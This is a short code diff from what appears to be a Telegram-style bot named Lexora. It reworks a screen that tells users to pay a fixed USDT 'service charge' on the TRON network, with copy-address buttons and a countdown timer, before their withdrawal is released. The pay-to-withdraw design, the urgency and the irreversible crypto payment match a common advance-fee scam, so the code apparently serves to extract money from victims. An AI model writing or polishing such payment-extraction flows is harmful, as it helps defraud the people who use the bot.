@@ -597,19 +597,22 @@ async function feeScreen(u: LexoraUser, s: Settings, id?: string) {
         60000,
     ),
   );
+  const fee = Number(wd.service_fee_amount || s.service_fee || 4).toFixed(2);
   await renderScreen(
     u,
-    `🔐 ONE-TIME SERVICE CHARGE\n\nWithdrawal: ${usd(
+    `🔐 SERVICE CHARGE — ${fee} USDT\n\nWithdrawal: ${usd(
       wd.amount,
-    )}\nCharge:     one-time, per account\n\n${LINE}\n\nSend exactly:\n${Number(
-      wd.service_fee_amount,
-    ).toFixed(2)} USDT\n\nNetwork:  🔴 TRON (TRC-20)\nAddress:\n${wallet}\n\n${LINE}\n⚠️ Send the exact amount — the cents identify your payment.\n⏳ Time left: ${minsLeft} minutes\n\nWe confirm it on the blockchain, then your withdrawal is released.`,
+    )}\nCharge:     ${fee} USDT (one-time, fixed)\nNetwork:    🔴 TRON (TRC-20)\nStatus:     ⏳ Awaiting payment\n⏳ Time left: ${minsLeft} min\n\nSend to:\n<code>${wallet}</code>\n\n${LINE}\nTap the buttons below to copy the address and amount, send ${fee} USDT on TRC-20, then tap CHECK.`,
     kb([
+      [{ text: "📋 COPY ADDRESS", copy: wallet }],
+      [{ text: `📋 COPY ${fee} USDT`, copy: fee }],
       [{ text: "🔄 I HAVE PAID — CHECK", data: `feechk:${wd.id}` }],
       [{ text: "❌ CANCEL WITHDRAWAL", data: `fcancel:${wd.id}` }],
       nav("wallet"),
     ]),
+    { parseMode: "HTML" },
   );
+
 }
 
 async function checkFeeNow(u: LexoraUser, s: Settings, id?: string) {
